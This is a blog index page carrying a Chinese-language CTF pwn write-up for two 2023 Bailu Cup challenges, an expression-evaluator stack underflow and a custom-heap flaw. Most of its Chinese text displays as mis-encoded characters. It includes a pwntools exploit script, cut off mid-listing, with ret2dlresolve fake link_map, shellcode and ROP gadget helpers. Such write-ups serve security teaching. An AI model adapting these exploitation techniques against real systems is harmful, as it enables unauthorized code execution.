<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="hkbin hkbin hkbin">
<meta property="og:type" content="website">
<meta property="og:title" content="hkbinçš„å°åšå®¢~">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="hkbinçš„å°åšå®¢~">
<meta property="og:description" content="hkbin hkbin hkbin">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hkbin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>hkbinçš„å°åšå®¢~</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hkbinçš„å°åšå®¢~</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="heartbeat fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AFpwn-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AFpwn-wp/" class="post-title-link" itemprop="url">2023æŸé¹­æ¯pwn wp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-10-12 12:36:58 / ä¿®æ”¹æ—¶é—´ï¼š12:43:29" itemprop="dateCreated datePublished" datetime="2023-10-12T12:36:58+08:00">2023-10-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.2k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>2023æŸé¹­æ¯pwn wp</h1>
<h1>PWN</h1>
<h2 id="eval">eval</h2>
<h3 id="æ¼æ´ç‚¹">æ¼æ´ç‚¹</h3>
<p>å¯¹æ•°ç»„æ¨¡æ‹Ÿæ ˆçš„é‚£ä¸ªæ ˆé¡¶æ²¡åšä¸‹æº¢æ ¡éªŒï¼Œå…ˆè¾“å…¥ç¬¦å·å¯ä»¥æ„æˆæº¢å‡ºç‚¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">200</span>/<span class="number">2</span>+(target_offset - <span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·è¾“å…¥å³å¯å°†æ ˆé¡¶è¿ç§»åˆ°ä»»æ„ä½ç½®</p>
<h3 id="éš¾ç‚¹">éš¾ç‚¹</h3>
<p>éœ€è¦é€†å‘æ•´ä¸ªæ¨¡æ‹Ÿæ ˆçš„ç»“æ„</p>
<p>å¯ä»¥é…åˆåŠ¨æ€è°ƒè¯•å¾—å‡ºæ¨¡æ‹Ÿæ ˆç»“æ„</p>
<p>addr+0 0</p>
<p>addr+1 ç¬¦å·ä½</p>
<p>addr+2 0</p>
<p>addr+3 æ ˆé¡¶åç§»</p>
<p>addr+4 ç¬¬ä¸€ä¸ªæ•°</p>
<p>addr+5 ç¬¬äºŒä¸ªæ•°</p>
<p>é€šè¿‡å¤„ç†ç¬¦å·è¿›è¡Œè¿ç®—çš„æ—¶å€™ï¼Œä¼šå¯¼è‡´addr+3 -= 1ï¼Œå°†åŸæœ¬åº”è¯¥å¡«åœ¨addr+4çš„æ•°å¡«åœ¨äº†addr+3å³å¯å®Œå…¨æ§åˆ¶offsetï¼Œè¿›è€Œæ§åˆ¶ä»»æ„ä½ç½®è¯»å†™</p>
<h2 id="heap">heap</h2>
<h3 id="æ¼æ´ç‚¹-2">æ¼æ´ç‚¹</h3>
<p>å¯¹å°å †å—(â‰¤0x80)å¤§å°çš„å †å—ç®¡ç†æœ‰é—®é¢˜ï¼Œæ²¡æœ‰è¿›è¡Œpreä½ç½®(+0x18)çš„æœ‰æ•ˆæ ¡éªŒï¼Œè¿›è€Œå¯ä»¥æ§åˆ¶ä»»æ„ä½ç½®è¯»å†™ï¼Œä½†è¦æ³¨æ„ä¼šå†™å…¥0x28çš„å¤´éƒ¨</p>
<p>è¿œç¨‹FLAGåŠ è½½è¿›äº†ç¯å¢ƒå˜é‡ä½ç½®ï¼Œé€šè¿‡æ³„éœ²_IO_2_1_stdout_ï¼ˆbssåŒºï¼‰è·å¾—libcvç‰ˆæœ¬ï¼Œå†ç”³è¯·libcä¸­__environå¤„ï¼Œåˆ¤æ–­æ˜¯å¦èƒ½æ³„éœ²å‡º0x7fffxxxxxxçš„å€¼åˆ¤æ–­åˆé€‚çš„libcç‰ˆæœ¬ï¼Œæœ€åç”³è¯·åˆ°å­˜å‚¨ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²å¤„çš„å†…å­˜ï¼Œç„¶åå¤šæ¬¡å°è¯•æ³„éœ²å‡ºFLAGç¯å¢ƒå˜é‡çš„å€¼å³å¯ã€‚(RIPæŒŸæŒä¸äº†ï¼Œæ ˆå†…è·ç¦»å°äº0x28ï¼Œç”³è¯·ä¼šè¦†ç›–ä¸Šä¸ªè¿”å›åœ°å€ï¼Œå¯¼è‡´Segment fault)</p>
<h3 id="éš¾ç‚¹-2">éš¾ç‚¹</h3>
<p>éœ€è¦é€†å‘æ•´ä¸ªä»–è‡ªå·±å†™çš„mallocå’Œfreeå‡½æ•°ä»¥åŠå †å—ç»“æ„ï¼Œæ¯”è¾ƒå¤æ‚ï¼Œé€†äº†è€åŠå¤©ï¼Œæ„Ÿè§‰åœ¨çœ‹æºç  ğŸ¤¨</p>
<p><img src="./images/2023%E6%9F%8F%E9%B9%AD%E6%9D%AFpwn%20wp%200bd8762223b64338b28bc9749ebf5510/Untitled.png" alt="Untitled"></p>
<h3 id="EXP">EXP</h3>
<p>éœ€è¦è¿›è¡Œå¤šæ¬¡æ“ä½œ(4æ¬¡)æ¯”è¾ƒå¤æ‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> gift</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;./libs/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;8.130.115.205&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;20199&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">mode = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpp</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>): <span class="comment"># fake_linkmap_addræŒ‡å‘ä¸€æ®µå¯æ§å†…å­˜ | known_func_ptræŒ‡å‘ä¸€ä¸ªå·²çŸ¥çš„å‡½æ•°çš„gotè¡¨åœ°å€ | offsetæ˜¯systemå‡½æ•°å’Œè¿™ä¸ªå‡½æ•°åœ¨libcä¸Šçš„åç§»</span></span><br><span class="line">    <span class="comment"># &amp;(2**64-1)æ˜¯å› ä¸ºoffseté€šå¸¸ä¸ºè´Ÿæ•°ï¼Œå¦‚æœä¸æ§åˆ¶èŒƒå›´ï¼Œp64åä¼šè¶Šç•Œï¼Œå‘ç”Ÿé”™è¯¯</span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) <span class="comment">#l_addr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 8ï¼Œä¹Ÿå°±æ˜¯DT_JMPRELï¼Œè‡³äºä¸ºä»€ä¹ˆæœ‰ä¸ª0ï¼Œå¯ä»¥å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„å†…å®¹</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) <span class="comment"># å¯ä»¥ä¸ºä»»æ„å€¼</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>) <span class="comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„.rel.pltçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x18,fake_rel_write,å› ä¸ºwriteå‡½æ•°pushçš„ç´¢å¼•æ˜¯0ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€é¡¹</span></span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) <span class="comment"># Rela-&gt;r_offset,æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œåº”è¯¥å­˜çš„æ˜¯gotè¡¨å¯¹åº”æ¡ç›®çš„åœ°å€ï¼Œè§£æå®Œæˆååœ¨è¿™ä¸ªåœ°å€ä¸Šå­˜æ”¾å‡½æ•°çš„å®é™…åœ°å€ï¼Œæ­¤å¤„æˆ‘ä»¬åªéœ€è¦è®¾ç½®ä¸€ä¸ªå¯è¯»å†™çš„åœ°å€å³å¯ </span></span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) <span class="comment"># Rela-&gt;r_info,ç”¨äºç´¢å¼•symtabä¸Šçš„å¯¹åº”é¡¹ï¼Œ7&gt;&gt;32=0ï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘symtabçš„ç¬¬ä¸€é¡¹</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)<span class="comment"># Rela-&gt;r_addend,ä»»æ„å€¼éƒ½è¡Œ</span></span><br><span class="line"></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)<span class="comment">#l_ns</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) <span class="comment"># å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„</span></span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) <span class="comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„symtabçš„åœ°å€,ä¸ºå·²è§£æå‡½æ•°çš„gotè¡¨åœ°å€-0x8</span></span><br><span class="line"></span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) <span class="comment"># fake_linkmap_addr + 0x68, å¯¹åº”çš„å€¼çš„æ˜¯DT_STRTABçš„åœ°å€ï¼Œç”±äºæˆ‘ä»¬ç”¨ä¸åˆ°strtabï¼Œæ‰€ä»¥éšæ„è®¾ç½®äº†ä¸€ä¸ªå¯è¯»åŒºåŸŸ</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) <span class="comment"># fake_linkmap_addr + 0x70 , å¯¹åº”çš„å€¼æ˜¯DT_SYMTABçš„åœ°å€</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>) <span class="comment"># fake_linkmap_addr + 0xf8, å¯¹åº”çš„å€¼æ˜¯DT_JMPRELçš„åœ°å€</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_shellcode</span>():</span><br><span class="line">    payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">    payload+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload=asm(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0</span>, arg2 = <span class="number">0</span>, arg3 = <span class="number">0</span></span>): <span class="comment"># -&gt;å¯èƒ½éœ€è¦å…·ä½“é—®é¢˜å…·ä½“åˆ†æ</span></span><br><span class="line">    payload = p64(part1)    <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)    <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)    <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span 